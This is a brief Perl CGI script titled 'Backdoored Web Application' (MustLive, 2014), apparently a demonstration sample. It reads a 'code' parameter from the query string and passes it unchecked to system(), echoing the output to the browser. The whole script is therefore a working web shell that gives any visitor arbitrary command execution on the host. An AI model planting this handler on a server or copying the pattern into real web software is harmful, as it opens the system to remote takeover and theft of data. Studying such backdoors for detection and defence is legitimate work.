#!/usr/bin/perl
# Backdoored Web Application v.1.0.1
# Copyright (C) MustLive 2014
my %command;
my ($key,$content) = split(/=/,$ENV{'QUERY_STRING'});
$content =~ tr/+/ /;
$content =~ s/%(..)/pack("c",hex($1))/ge;
$command{$key} = $content;
print "Content-type:text/html\n\n";
print "<h3>Backdoored Web Application</h3>\n";
if ($command{'code'}) {
	print "<pre>\n";
	system($command{'code'});
	print "</pre>\n";
}
else {
	print "<p>This is the test.</p>\n";
}
